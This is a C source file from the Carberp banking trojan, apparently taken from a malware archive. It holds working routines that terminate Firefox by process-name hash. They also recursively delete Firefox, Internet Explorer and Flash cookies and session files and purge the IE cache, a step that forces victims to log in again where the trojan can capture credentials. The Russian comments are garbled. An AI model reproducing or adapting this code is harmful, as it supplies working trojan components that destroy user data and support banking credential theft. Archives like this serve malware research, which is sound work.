/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "windows.h"
#include "coocksol.h"
#include "GetApi.h"
//#include "Exploit.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "shlobj.h"
#include "InternetExplorer.h"

bool DeleteFiles(PCHAR Path, PCHAR Ext, bool Recursive, bool DeleteSubDir);

bool IgnorePath(char *Path)
{
	// ������� ������ ������ � ������ ���� ���� ���� �� ".", ".."
	return (m_lstrcmp(Path, ".") == 0) || (m_lstrcmp(Path,"..") == 0);
}


bool DeleteInSubDirectories(PCHAR Path, PCHAR Mask, bool DeleteSubDir)
{
	// ������� ���������� ������� ����� � ��������������
	PCHAR SearchMask = StrNew(2, Path, "*.*");
    bool Result = false;
	//  ���������� �����
	//  ���� ������ ����������
	WIN32_FIND_DATA Find;
	HANDLE File = pFindFirstFileA(SearchMask, &Find);
	//  ���������� �� �������, ������� �� �������
	if (File == INVALID_HANDLE_VALUE)
	{
		StrFree(SearchMask);
		return false;
	}

	// �������������� ����
	do
	{
		if ((Find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0 && !IgnorePath(Find.cFileName))
		{
			PCHAR NewPath = StrNew(3, Path, Find.cFileName, "\\");
			if (DeleteFiles(NewPath, Mask, true, DeleteSubDir))
				Result = true;
			if (DeleteSubDir)
					pRemoveDirectoryA(NewPath);
			StrFree(NewPath);
        }
	}
	while (pFindNextFileA(File, &Find));


    pFindClose(File);
	StrFree(SearchMask);
	return Result;
}


bool DeleteFiles(PCHAR Path, PCHAR Ext, bool Recursive, bool DeleteSubDir)
{
	// ������� ������� ����� � ����������� Ext �� ���������� Path
	// ���������� ����� ������ �������� ������
	if (Path == NULL || Ext == NULL)
		return 0;
	bool Result = false;

	// � ����� � ���, ��� ����� ������������ ����� ��� �������
	// ���������� ���������� �� �����,  ���������� ������������ ��������
	if (Recursive)
		Result = DeleteInSubDirectories(Path, Ext, DeleteSubDir);

	PCHAR Mask = StrNew(2, Path, Ext);

	WIN32_FIND_DATA Search;
	HANDLE File = pFindFirstFileA(Mask, &Search);
	if (File == INVALID_HANDLE_VALUE)
	{
		StrFree(Mask);
		return Result;
	}
	// ���������� ��������� �����
	while (File != NULL)
	{
        if ((Search.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
		{
			// ������� ����
			PCHAR FileName = StrNew(2, Path, Search.cFileName);
			//  � ������ ���� ���� ����� ������� "������ ������" ������
			//  ��� ��������
			if ((Search.dwFileAttributes & FILE_ATTRIBUTE_READONLY) != 0)
				pSetFileAttributesA(FileName, FILE_ATTRIBUTE_ARCHIVE);

			// ������� ����
			if (pDeleteFileA(FileName))
				Result = true;
			StrFree(FileName);
        }

		// �������� ��������� ����
		if (!pFindNextFileA(File, &Search)) break;
	}

	// ����������� ������
	StrFree(Mask);
	pFindClose(File);

	return Result;
}

bool ClearDirectory(PCHAR Path)
{
	// ������� ������� ���������� ������ �� �� ��� ����� � �������������
	return DeleteFiles(Path, "*", true, true);
}

PCHAR GetAppDataPath()
 {
	 // ������� ���������� ���� � ���������� �������� ������ ����������
	char Path[MAX_PATH];
	DWORD Size = MAX_PATH;
	if (!(BOOL)pSHGetSpecialFolderPathA(NULL, &Path[0], CSIDL_APPDATA, Size))
		return NULL;

    PCHAR Result = StrNew(2, &Path[0], "\\");
	return Result;
 }


void KillFireFox()
{
	DWORD Hash_FireFox = 0x7712FEAE; // ��� firefox.exe

	// �������� ������������� ��������
	DWORD Pid = GetProcessIdByHash(Hash_FireFox);

	if ( Pid != (DWORD)-1)
		pWinStationTerminateProcess(NULL, Pid , DBG_TERMINATE_PROCESS );//������ �����
}

bool DeleteFFCookies()
{
	//	 ������� ������� ���� ����� �������� Mozilla Firefox
	PCHAR DataPath = GetAppDataPath();
	if (DataPath == NULL)
		return false;

	PCHAR Path = StrNew(2, DataPath, "Mozilla\\Firefox\\Profiles\\");
	StrFree(DataPath);

	KillFireFox();
    bool Result = DeleteFiles(Path, "cookies.sqlite", true, false);
    bool Result2 = DeleteFiles(Path, "sessionstore.*", true, false);

	StrFree(Path);

	return Result;
}

bool DeleteSOL()
{
	// ������� ������� ������ ��������� Macromedia FlashPlayer
	PCHAR DataPath = GetAppDataPath();
	if (DataPath == NULL)
		return false;

	// ������ ���� � ����� �������
	PCHAR Path = StrNew(2, DataPath, "Macromedia\\Flash Player\\");
	StrFree(DataPath);
	// ������ ����������
	bool Result = ClearDirectory(Path);
	Result = Result | DeleteFiles("C:\\WINDOWS\\system32\\Macromed\\", "*.sol", true, false);

	StrFree(Path);
	return Result;
}

void IEClearCache()
{
 // ������� ������� ��� �������� ����������. 
 BOOL bResult = FALSE;
 BOOL bDone = FALSE;

 LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry = NULL;

 DWORD dwTrySize, dwEntrySize = 4096; 

 HANDLE hCacheDir = NULL;

 DWORD dwError = ERROR_INSUFFICIENT_BUFFER;

 do
 {
  switch ( dwError )
  {
   case ERROR_INSUFFICIENT_BUFFER:

    if ( lpCacheEntry != NULL )
    {
     MemFree( lpCacheEntry );
    }

    lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)MemAlloc( dwEntrySize );

    if ( lpCacheEntry == NULL )
    {
     return;
    }

    lpCacheEntry->dwStructSize = dwEntrySize;

    dwTrySize = dwEntrySize;

    BOOL bSuccess;

    if ( hCacheDir == NULL )
    {
     bSuccess = ( hCacheDir = (HANDLE)pFindFirstUrlCacheEntryA( NULL, lpCacheEntry,&dwTrySize ) ) != NULL;
    }
    else
    {
     bSuccess = (BOOL)pFindNextUrlCacheEntryA( hCacheDir, lpCacheEntry, &dwTrySize );
    }

    if ( bSuccess )
    {
     dwError = ERROR_SUCCESS;
    }
    else
    {
     dwError  = (DWORD)pGetLastError();
     dwEntrySize = dwTrySize; // ���������� ����� ������ ������
    }

   break;
  
   case ERROR_NO_MORE_ITEMS:

    bDone = TRUE;
    bResult = TRUE;

   break;

   case ERROR_SUCCESS:

    pDeleteUrlCacheEntry( lpCacheEntry->lpszSourceUrlName );
 
    dwTrySize = dwEntrySize;

    if ( pFindNextUrlCacheEntryA( hCacheDir, lpCacheEntry, &dwTrySize ) )
    {
     dwError = ERROR_SUCCESS;
    }
    else
    {
     dwError = (DWORD)pGetLastError();
     dwEntrySize = dwTrySize;
    }

   break;
    
   default:

    bDone = TRUE;

   break;
  }

  if( bDone )
  {
   MemFree( lpCacheEntry );

   if ( hCacheDir )
   {
    pFindCloseUrlCache( hCacheDir );
   }
  }
 }
 while( !bDone );

 return;
}

int DeleteIECookies(int os)
{
	char username[256];
	DWORD name_len = 256;
	if(!pGetUserNameA(&username[0], &name_len)) return false;

	char *Path_cookies = NULL;

	switch(os)
	{
	case 1:
		Path_cookies = (char*)MemAlloc(m_lstrlen("C:\\Documents and Settings\\")+name_len+m_lstrlen("\\Cookies"));
		m_lstrcpy(Path_cookies,"C:\\Documents and Settings\\");
		m_lstrcat(Path_cookies,&username[0]);
		m_lstrcat(Path_cookies,"\\Cookies\\");
		break;
	case 2:
		Path_cookies = (char*)MemAlloc(m_lstrlen("C:\\Users\\")+name_len+m_lstrlen("\\AppData\\Roaming\\Microsoft\\Windows\\Cookies"));
		m_lstrcpy(Path_cookies,"C:\\Users\\");
		m_lstrcat(Path_cookies,&username[0]);
		m_lstrcat(Path_cookies,"\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\");
		break;
	default:
		return -1;
	}

	DeleteFiles(Path_cookies, "*.txt", true, false);
	/*
	if(Path_cookies == NULL) return -1;
	WIN32_FIND_DATA data;
	char *Path_cookies_find = (char*)MemAlloc(m_lstrlen(Path_cookies)+2);
	m_lstrcpy(Path_cookies_find,Path_cookies);
	m_lstrcat(Path_cookies_find,"\\*");
	HANDLE nFindFile = FindFirstFile(Path_cookies_find,&data);
	if(nFindFile==NULL) return -1;
	do
	{
		if(m_lstrcmp(data.cFileName,".")==0 || m_lstrcmp(data.cFileName,"..")==0) continue;
		char *Path_file = (char*)MemAlloc(m_lstrlen(Path_cookies)+m_lstrlen(data.cFileName)+1);
		m_lstrcpy(Path_file,Path_cookies);
		m_lstrcat(Path_file,"\\");
		m_lstrcat(Path_file,data.cFileName);
		if(!DeleteFile(Path_file))
		{
			DWORD err = pGetLastError();
		}
		//MemFree(Path_file);
	}
	while(FindNextFile(nFindFile,&data));
	FindClose(nFindFile);
	//MemFree(Path_cookies);*/
	return 0;
}

void DeleteIE_cookies(char* os)
{
	if(m_strstr(os, "Windows XP"))
	{
		DeleteIECookies(1);
	}
	else if(m_strstr(os, "Windows Vista") ||
			m_strstr(os, "Windows Seven") ||
			m_strstr(os, "Windows Server 2008") ||
			m_strstr(os, "Windows Server 2008 R2"))
	{
		DeleteIECookies(2);
	}
	else
	{
		DeleteIECookies(1);
		DeleteIECookies(2);
	}
}

void WINAPI DeleteBrowsersCookies()
{
	// ������� ������� ������ ��������� � Macromedia Flash Player
	IEClearCache();
	DeleteIECookies(1);
	DeleteIECookies(2);
	//DeleteIE_cookies("Windows Vista");
	DeleteFFCookies();
	DeleteSOL();
}
